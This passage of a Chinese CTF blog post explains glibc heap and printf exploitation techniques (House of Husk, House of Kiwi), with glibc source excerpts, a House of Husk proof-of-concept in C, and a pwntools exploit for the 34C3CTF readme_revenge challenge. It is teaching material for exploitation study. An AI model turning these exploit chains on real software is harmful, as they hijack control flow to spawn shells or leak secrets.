<p>利用 <code>house of orange</code> 将 <code>_IO_list_all</code> 的 <code>vtable</code> 指向 <code>_IO_str_jumps</code>，然后利用 <code>abort</code> 调用 <code>_IO_OVERFLOW-&gt;_IO_str_overflow</code> 然后进入我们上面讲的调用流，最后调用 <code>system(&quot;/bin/sh\x00&quot;)</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231023172813846.png"
                      alt="image-20231023172813846"
                ></p>
<p>最后<code>libc</code> 的低 <code>32</code> 位地址为负时，攻击才会成功。</p>
<h1 id="House-of-husk"><a href="#House-of-husk" class="headerlink" title="House of husk"></a>House of husk</h1><p><code>glibc &gt;= 2.23</code></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这种攻击方式主要是利用了<code>printf</code>的一个调用链，应用场景是只能分配较大 <code>chunk</code> 时(超过fastbin)，存在或可以构造出 <code>UAF</code> 漏洞。<code>printf</code> 函数通过检查 <code>__printf_function_table</code> 是否为空，来判断是否有自定义的格式化字符，若为 <code>printf</code> 类格式字符串函数，则会根据格式字符串的种类去执行 <code>__printf_arginfo_table[spec]</code> 处的函数指针。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_function (<span class="type">int</span> spec, printf_function converter, printf_arginfo_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __register_printf_specifier (spec, converter, (printf_arginfo_size_function*) arginfo);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_specifier (<span class="type">int</span> spec, printf_function converter, printf_arginfo_size_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 不在 0~0xff 范围内则调用 __set_errno 并返回 -1</span></span><br><span class="line">  	<span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="type">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      	__set_errno (EINVAL);</span><br><span class="line">      	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> 	<span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  	__libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  	<span class="keyword">if</span> (__printf_function_table == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 若spec为空，程序则会通过calloc分配两个堆地址来存放</span></span><br><span class="line">        <span class="comment">// __printf_arginfo_table和__printf_function_table</span></span><br><span class="line">      	__printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line">		<span class="built_in">calloc</span> (UCHAR_MAX + <span class="number">1</span>, <span class="built_in">sizeof</span> (<span class="type">void</span> *) * <span class="number">2</span>);</span><br><span class="line">      	<span class="keyword">if</span> (__printf_arginfo_table == <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">	  		result = <span class="number">-1</span>;</span><br><span class="line">	  		<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">      	__printf_function_table = (printf_function **)(__printf_arginfo_table + UCHAR_MAX + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>我们可以利用这样一条调用链<code>printf-&gt;vfprintf-&gt;printf_positional-&gt;__parse_one_specmb</code>，通过篡改<code>__printf_arginfo_table</code>和<code>__printf_function_table</code>来进行攻击，可以看到当<code>__printf_function_table</code>非空，将会调用<code>printf_positional</code>函数</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__printf (<span class="type">const</span> <span class="type">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">	va_list arg;</span><br><span class="line">    <span class="type">int</span> done;</span><br><span class="line">    <span class="built_in">va_start</span> (arg, format);</span><br><span class="line">    done = <span class="built_in">vfprintf</span> (stdout, format, arg);</span><br><span class="line">    <span class="built_in">va_end</span> (arg);</span><br><span class="line">    <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">vfprintf</span> <span class="params">(FILE *s, <span class="type">const</span> CHAR_T *format, va_list ap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">  	<span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    		<span class="keyword">goto</span> do_positional;</span><br><span class="line">	...</span><br><span class="line">do_positional:</span><br><span class="line">	...</span><br><span class="line">  	done = <span class="built_in">printf_positional</span> (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">			    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">			    save_errno, grouping, thousands_sep);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">printf_positional</span> <span class="params">(_IO_FILE *s, <span class="type">const</span> CHAR_T *format, <span class="type">int</span> readonly_format,</span></span></span><br><span class="line"><span class="params"><span class="function">		   va_list ap, va_list *ap_savep, <span class="type">int</span> done, <span class="type">int</span> nspecs_done,</span></span></span><br><span class="line"><span class="params"><span class="function">		   <span class="type">const</span> UCHAR_T *lead_str_end,</span></span></span><br><span class="line"><span class="params"><span class="function">		   CHAR_T *work_buffer, <span class="type">int</span> save_errno,</span></span></span><br><span class="line"><span class="params"><span class="function">		   <span class="type">const</span> <span class="type">char</span> *grouping, THOUSANDS_SEP_T thousands_sep)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">    nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">extern</span> printf_function **__printf_function_table;</span><br><span class="line">	<span class="type">int</span> function_done;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (spec &lt;= UCHAR_MAX</span><br><span class="line">	    &amp;&amp; __printf_function_table != <span class="literal">NULL</span></span><br><span class="line">	    &amp;&amp; __printf_function_table[(<span class="type">size_t</span>) spec] != <span class="literal">NULL</span>)</span><br><span class="line">	 &#123;</span><br><span class="line">	      <span class="type">const</span> <span class="type">void</span> **ptr = <span class="built_in">alloca</span> (specs[nspecs_done].ndata_args</span><br><span class="line">					 * <span class="built_in">sizeof</span> (<span class="type">const</span> <span class="type">void</span> *));</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Fill in an array of pointers to the argument values.  */</span></span><br><span class="line">	      <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; specs[nspecs_done].ndata_args; ++i)</span><br><span class="line">			ptr[i] = &amp;args_value[specs[nspecs_done].data_arg + i];</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Call the function.  */</span></span><br><span class="line">	      function_done = __printf_function_table[(<span class="type">size_t</span>) spec](s, &amp;specs[nspecs_done].info, ptr);</span><br><span class="line">      	  ...</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__parse_one_specmb (<span class="type">const</span> UCHAR_T *format, <span class="type">size_t</span> posn,</span><br><span class="line">		    <span class="keyword">struct</span> printf_spec *spec, <span class="type">size_t</span> *max_ref_arg)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">      || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">      || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">      <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">	 uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">	 the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">      || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">				   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">				    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>泄露 <code>libc</code> 地址。</p>
</li>
<li><p>修改 <code>global_max_fast</code> 为很大的值，可以 <code>large bin attack/unsorted bin attack</code></p>
</li>
<li><p>将 <code>__printf_function_table</code> 或者 <code>__printf_arginfo_table</code> 覆盖为指向写有 <code>one_gadget</code> 的内存的指针。其中 <code>one_gadget</code> 在内存中的偏移对应与之后触发漏洞的 <code>spec</code> 。</p>
</li>
<li><p>如果是利用 <code>__printf_function_table</code> 触发漏洞需要让 <code>__printf_arginfo_table</code> 指向一块内存并且该内存对应 <code>spec</code> 偏移处设为 null ，否则会在 <code>__parse_one_specmb</code> 函数的 if 判断中造成不可预知的错误。</p>
</li>
<li><p>最后调用 <code>printf</code> 触发漏洞获取 <code>shell</code> 。</p>
</li>
</ul>
<p><strong>图解</strong></p>
<p>对于 <code>glibc-2.27</code> 而言：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/husk.png"
                      alt="husk"
                ></p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a><a class="link"   href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/013910" >POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is a Proof-of-Concept for House of Husk</span></span><br><span class="line"><span class="comment"> * This PoC is supposed to be run with libc-2.27.</span></span><br><span class="line"><span class="comment"> gcc poc.c -o poc -no-pie -g</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA       0x3ebc40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_MAX_FAST  0x3ed940</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_FUNCTABLE 0x3f0738</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_ARGINFO   0x3ec870</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ONE_GADGET       0x10a2fc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> libc_base;</span><br><span class="line">    <span class="type">char</span> *a[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>); <span class="comment">// make printf quiet</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* leak libc */</span></span><br><span class="line">    a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* UAF chunk */</span></span><br><span class="line">    a[<span class="number">1</span>] = <span class="built_in">malloc</span>(<span class="built_in">offset2size</span>(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">    a[<span class="number">2</span>] = <span class="built_in">malloc</span>(<span class="built_in">offset2size</span>(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">    a[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* avoid consolidation */</span></span><br><span class="line">    <span class="built_in">free</span>(a[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// unsorted bin 泄露 libc</span></span><br><span class="line">    libc_base = *(<span class="type">unsigned</span> <span class="type">long</span>*)a[<span class="number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc @ 0x%lx\n&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* prepare fake printf arginfo table */</span></span><br><span class="line">    <span class="comment">/* &#x27;X&#x27;-2 mean that prev_size | size */</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">2</span>] + (<span class="string">&#x27;X&#x27;</span> - <span class="number">2</span>) * <span class="number">8</span>) = libc_base + ONE_GADGET;</span><br><span class="line">    <span class="comment">// now __printf_arginfo_table[&#x27;X&#x27;] = one_gadget;</span></span><br><span class="line">    <span class="comment">/*(unsigned long*)(a[1] + (&#x27;X&#x27; - 2) * 8) = libc_base + ONE_GADGET; */</span></span><br><span class="line">    <span class="comment">/* unsorted bin attack */</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">0</span>] + <span class="number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="number">0x10</span>;</span><br><span class="line">    a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* overwrite global_max_fast */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite __printf_arginfo_table and __printf_function_table */</span></span><br><span class="line">    <span class="built_in">free</span>(a[<span class="number">1</span>]);<span class="comment">// __printf_function_table =&gt; a heap_addr which is not NULL</span></span><br><span class="line">    <span class="built_in">free</span>(a[<span class="number">2</span>]);<span class="comment">// =&gt; one_gadget</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ignite! */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024120231850.png"
                      alt="image-20231024120231850"
                ></p>
<h2 id="34C3CTF2017-readme-revenge"><a href="#34C3CTF2017-readme-revenge" class="headerlink" title="[34C3CTF2017]readme_revenge"></a><a class="link"   href="https://github.com/firmianay/CTF-All-In-One/tree/master/src/writeup/6.1.13_pwn_34c3ctf2017_readme_revenge" >[34C3CTF2017]readme_revenge <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><h3 id="检查信息-1"><a href="#检查信息-1" class="headerlink" title="检查信息"></a>检查信息</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024113648875.png"
                      alt="image-20231024113648875"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024113706190.png"
                      alt="image-20231024113706190"
                ></p>
<p>静态编译并且没有去除符号。</p>
<h3 id="试运行-2"><a href="#试运行-2" class="headerlink" title="试运行"></a>试运行</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024113820842.png"
                      alt="image-20231024113820842"
                ></p>
<h3 id="逆向分析-3"><a href="#逆向分析-3" class="headerlink" title="逆向分析"></a>逆向分析</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400A0D                               ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:0000000000400A0D                               public main</span><br><span class="line">.text:0000000000400A0D                               main proc near                          ; DATA XREF: _start+1D↑o</span><br><span class="line">.text:0000000000400A0D</span><br><span class="line">.text:0000000000400A0D                               var_1020= qword ptr -1020h</span><br><span class="line">.text:0000000000400A0D</span><br><span class="line">.text:0000000000400A0D                               ; __unwind &#123;</span><br><span class="line">.text:0000000000400A0D 55                            push    rbp</span><br><span class="line">.text:0000000000400A0E 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000400A11 48 8D A4 24 E0 EF FF FF       lea     rsp, [rsp-1020h]</span><br><span class="line">.text:0000000000400A19 48 83 0C 24 00                or      [rsp+1020h+var_1020], 0</span><br><span class="line">.text:0000000000400A1E 48 8D A4 24 20 10 00 00       lea     rsp, [rsp+1020h]</span><br><span class="line">.text:0000000000400A26 48 8D 35 B3 69 2B 00          lea     rsi, name</span><br><span class="line">.text:0000000000400A2D 48 8D 3D 50 C7 08 00          lea     rdi, unk_48D184	;%s</span><br><span class="line">.text:0000000000400A34 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:0000000000400A39 E8 22 71 00 00                call    __isoc99_scanf</span><br><span class="line">.text:0000000000400A39</span><br><span class="line">.text:0000000000400A3E 48 8D 35 9B 69 2B 00          lea     rsi, name</span><br><span class="line">.text:0000000000400A45 48 8D 3D 3B C7 08 00          lea     rdi, aHiSBye                    ; &quot;Hi, %s. Bye.\n&quot;</span><br><span class="line">.text:0000000000400A4C B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:0000000000400A51 E8 7A 6F 00 00                call    printf</span><br><span class="line">.text:0000000000400A51</span><br><span class="line">.text:0000000000400A56 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:0000000000400A5B 5D                            pop     rbp</span><br><span class="line">.text:0000000000400A5C C3                            retn</span><br><span class="line">.text:0000000000400A5C                               ; &#125; // starts at 400A0D</span><br><span class="line">.text:0000000000400A5C</span><br><span class="line">.text:0000000000400A5C                               main endp</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024114633005.png"
                      alt="image-20231024114633005"
                ></p>
<p>存在缓冲区漏洞，向 <code>.bss</code> 节的 <code>name</code> 变量写入内容，然后打印它。并且 <code>flag</code> 位于 <code>.data</code> 节，可以利用 <code>__stack_chk_fail()</code> 将其打印出来。</p>
<h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用缓冲区溢出篡改 <code>__printf_function_table</code> 指向一个非零值，因为 <code>%s</code> 的 <code>ascii</code> 是 <code>0x73</code>，所以让 <code>__printf_arginfo_table</code> 指向 <code>fake_arginfo_table[0x73*8] == __stack_chk_fail()</code>，将 <code>argv[0]</code> 改为 <code>flag</code> 地址。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024115056364.png"
                      alt="image-20231024115056364"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024115137320.png"
                      alt="image-20231024115137320"
                ></p>
<p><strong>exp</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./readme_revenge&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x6b4040</span></span><br><span class="line">name_addr = <span class="number">0x6b73e0</span></span><br><span class="line">argv_addr = <span class="number">0x6b7980</span></span><br><span class="line">func_table = <span class="number">0x6b7a28</span></span><br><span class="line">arginfo_table = <span class="number">0x6b7aa8</span></span><br><span class="line"></span><br><span class="line">stack_chk_fail = <span class="number">0x4359b0</span></span><br><span class="line"></span><br><span class="line">payload  = p64(flag_addr)       <span class="comment"># name</span></span><br><span class="line">payload  = payload.ljust(<span class="number">0x73</span> * <span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(stack_chk_fail)  <span class="comment"># __printf_arginfo_table[spec-&gt;info.spec]</span></span><br><span class="line">payload  = payload.ljust(argv_addr - name_addr, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(name_addr)       <span class="comment"># argv</span></span><br><span class="line">payload  = payload.ljust(func_table - name_addr, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(name_addr)       <span class="comment"># __printf_function_table</span></span><br><span class="line">payload  = payload.ljust(arginfo_table - name_addr, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(name_addr)       <span class="comment"># __printf_arginfo_table</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io, <span class="string">&#x27;b *0x400A4C&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024115210102.png"
                      alt="image-20231024115210102"
                ></p>
<h1 id="House-of-Kiwi"><a href="#House-of-Kiwi" class="headerlink" title="House of Kiwi"></a>House of Kiwi</h1><p><code>glibc &lt; 2.36</code>，这里有一点需要注意，高版本的 <code>glibc</code> 的 <code>_IO_file_jumps</code> 有的是不可写的，所以可以通过 <code>vmmap</code> 来查看此段是否具有可写权限。可以通过 <code>mprotect((void*)(libc_base + 0x215000), 0x2000, PROT_READ | PROT_WRITE);</code> 改写其权限。</p>
<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>有如下调用链:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> NDEBUG</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> assert(expr) ((void) 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> assert(expr) \</span></span><br><span class="line"><span class="meta">  ((expr)								      \</span></span><br><span class="line"><span class="meta">   ? ((void) 0)								      \</span></span><br><span class="line"><span class="meta">   : __malloc_assert (#expr, __FILE__, __LINE__, __func__))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="type">char</span> *__progname;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  <span class="built_in">fflush</span> (stderr);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p><em>tips:通过<code>large bin chunk</code>的<code>size</code>中<code>flag</code>位修改,或者<code>top chunk</code>的<code>inuse</code>写<code>0</code>等方法可以触发<code>assert</code></em></p>
<p>当我们触发 <code>assert</code> 断言时会调用 <code>__malloc_assert</code>，<code>__malloc_assert</code> 里有这样一条调用链：<code>fflush-&gt;_IO_fflush</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_fflush (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_flush_all ();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> result;</span><br><span class="line">      <span class="built_in">CHECK_FILE</span> (fp, EOF);</span><br><span class="line">      _IO_acquire_lock (fp);</span><br><span class="line">      result = _IO_SYNC (fp) ? EOF : <span class="number">0</span>;</span><br><span class="line">      _IO_release_lock (fp);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>执行到 <code>result = _IO_SYNC (fp) ? EOF : 0;</code> 时，会调用 <code>_IO_new_file_sync</code>， <code>_IO_file_jumps_</code> 可写。因此将 <code>_IO_file_jumps_</code> 对应 <code>_IO_new_file_sync</code> 函数指针的位置覆盖为 <code>one_gadget</code> 就可以获取 <code>shell</code> 。</p>
<p>利用前提：</p>
<ol>
<li>能够触发 <code>__malloc_assert</code>。</li>
<li>能够申请到 <code>_IO_file_sync</code> 和 <code>_IO_helper_jumps</code> 这两个位置并且修改。</li>
</ol>
<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><p><strong>未开沙箱 poc</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getshell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span 